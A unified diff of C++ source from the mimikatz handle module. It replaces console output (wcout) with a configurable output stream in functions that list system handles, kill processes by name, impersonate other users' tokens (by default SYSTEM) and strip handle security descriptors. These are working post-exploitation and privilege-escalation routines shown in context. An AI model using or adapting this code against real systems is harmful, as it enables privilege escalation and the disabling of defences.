@@ -42,39 +42,39 @@ bool mod_mimikatz_handle::list(vector<wstring> * arguments)
 
 						if(isToken || isProcess)
 						{
-							wcout << setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  ";
+							(*outputStream) << setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  ";
 
 							if(isProcessList)
 							{
 								mod_process::KIWI_PROCESSENTRY32 * processHote = new mod_process::KIWI_PROCESSENTRY32();
 								if(mod_process::getProcessEntryFromProcessId(monHandle->ProcessId, processHote, mesProcess))
-									wcout << setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right;
+									(*outputStream) << setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right;
 								delete processHote;
 							}
 
-							wcout << L" -> " << setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' << tokenType << L'\t';
+							(*outputStream) << L" -> " << setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' << tokenType << L'\t';
 
 							if(isToken)
 							{
 								wstring userName, domainName;
 								if(mod_secacl::tokenUser(nouveauHandle, &userName, &domainName))
-									wcout << L'\t' << domainName << L'\\' << userName ;
-								else wcout << mod_system::getWinError();
+									(*outputStream) << L'\t' << domainName << L'\\' << userName ;
+								else (*outputStream) << mod_system::getWinError();
 							}
 							else if(isProcess)
 							{
 								DWORD monPid = GetProcessId(nouveauHandle);
-								wcout << monPid;
+								(*outputStream) << monPid;
 
 								if(isProcessList)
 								{
 									mod_process::KIWI_PROCESSENTRY32 * processKiwi = new mod_process::KIWI_PROCESSENTRY32();
 									if(mod_process::getProcessEntryFromProcessId(monPid, processKiwi, mesProcess))
-										wcout << L'\t' << processKiwi->szExeFile;
+										(*outputStream) << L'\t' << processKiwi->szExeFile;
 									delete processKiwi;
 								}
 							}
-							wcout << endl;
+							(*outputStream) << endl;
 						}
 					}
 					CloseHandle(nouveauHandle);
@@ -83,7 +83,7 @@ bool mod_mimikatz_handle::list(vector<wstring> * arguments)
 			}
 		}
 	}
-	else wcout << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
 
 	delete mesHandles;
 
@@ -127,7 +127,7 @@ bool mod_mimikatz_handle::processStop(vector<wstring> * arguments)
 									{
 										if(_wcsicmp(processKiwi->szExeFile.c_str(), monProcessName->c_str()) == 0)
 										{
-											wcout <<
+											(*outputStream) <<
 												setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  " <<
 												setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right << L" -> " <<
 												setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' <<
@@ -135,34 +135,34 @@ bool mod_mimikatz_handle::processStop(vector<wstring> * arguments)
 												;
 											
 												
-											wcout << L"\tTerminate Process - ";	
+											(*outputStream) << L"\tTerminate Process - ";	
 											if(TerminateProcess(nouveauHandle, ERROR_SUCCESS) != 0)
 											{
-												wcout << L"OK";
+												(*outputStream) << L"OK";
 											}
 											else
 											{
-												wcout << L"KO ; " << mod_system::getWinError() << endl <<
+												(*outputStream) << L"KO ; " << mod_system::getWinError() << endl <<
 												L"\tJob : "; 
 
 												if(HANDLE monObject = CreateJobObject(NULL, NULL))
 												{
 													if(AssignProcessToJobObject(monObject, nouveauHandle))
 													{
-														wcout << L"TerminateJobObject - ";
+														(*outputStream) << L"TerminateJobObject - ";
 														if(TerminateJobObject(monObject, ERROR_SUCCESS) != 0)
 														{
-															wcout << L"OK";
+															(*outputStream) << L"OK";
 														}
-														else wcout << L"KO ; " << mod_system::getWinError();
+														else (*outputStream) << L"KO ; " << mod_system::getWinError();
 													}
-													else wcout << L"AssignProcessToJobObject - KO ; " << mod_system::getWinError();
+													else (*outputStream) << L"AssignProcessToJobObject - KO ; " << mod_system::getWinError();
 													CloseHandle(monObject);
 												}
 
 											}
 											
-											wcout << endl;
+											(*outputStream) << endl;
 										}
 									}
 								}
@@ -177,7 +177,7 @@ bool mod_mimikatz_handle::processStop(vector<wstring> * arguments)
 			}
 		}
 	}
-	else wcout << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
 
 	delete mesHandles;
 
@@ -219,7 +219,7 @@ bool mod_mimikatz_handle::tokenImpersonate(vector<wstring> * arguments)
 									{
 										if(_wcsicmp(userName.c_str(), (arguments->empty() ? L"system" : arguments->front().c_str())) == 0)
 										{
-											wcout <<
+											(*outputStream) <<
 												setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  " <<
 												setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right << L" -> " <<
 												setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' <<
@@ -229,22 +229,22 @@ bool mod_mimikatz_handle::tokenImpersonate(vector<wstring> * arguments)
 											{
 												if(ImpersonateLoggedOnUser(nouveauHandle))
 												{
-													wcout << L"ok !!" << endl;
+													(*outputStream) << L"ok !!" << endl;
 													break;
 												}
 												else
 												{
-													wcout << L"ko - ImpersonateLoggedOnUser ; " << mod_system::getWinError() << endl;
+													(*outputStream) << L"ko - ImpersonateLoggedOnUser ; " << mod_system::getWinError() << endl;
 												}
 											}
 											else
 											{
-												wcout << L"ko - mod_secacl::exchangeDupToken ; " << mod_system::getWinError() << endl;
+												(*outputStream) << L"ko - mod_secacl::exchangeDupToken ; " << mod_system::getWinError() << endl;
 											}
 
 										}
 									}
-									else wcout << mod_system::getWinError();
+									else (*outputStream) << mod_system::getWinError();
 								}
 								delete processHote;
 							}
@@ -256,7 +256,7 @@ bool mod_mimikatz_handle::tokenImpersonate(vector<wstring> * arguments)
 			}
 		}
 	}
-	else wcout << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
 
 	delete mesHandles;
 
@@ -284,7 +284,7 @@ bool mod_mimikatz_handle::nullAcl(vector<wstring> * arguments)
 							toACL = find(arguments->begin(), arguments->end(), tokenType) != arguments->end();
 						
 						if(toACL)
-							wcout << monHandle->ProcessId << L'\t' << monHandle->Handle << L'\t' << tokenType << L"\t\t" << (mod_secacl::nullSdToHandle(&nouveauHandle) ? L"NULL !" : L"KO") << endl;
+							(*outputStream) << monHandle->ProcessId << L'\t' << monHandle->Handle << L'\t' << tokenType << L"\t\t" << (mod_secacl::nullSdToHandle(&nouveauHandle) ? L"NULL !" : L"KO") << endl;
 					}
 					CloseHandle(nouveauHandle);
 				}
@@ -292,7 +292,7 @@ bool mod_mimikatz_handle::nullAcl(vector<wstring> * arguments)
 			}
 		}
 	}
-	else wcout << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
 
 	delete mesHandles;
 
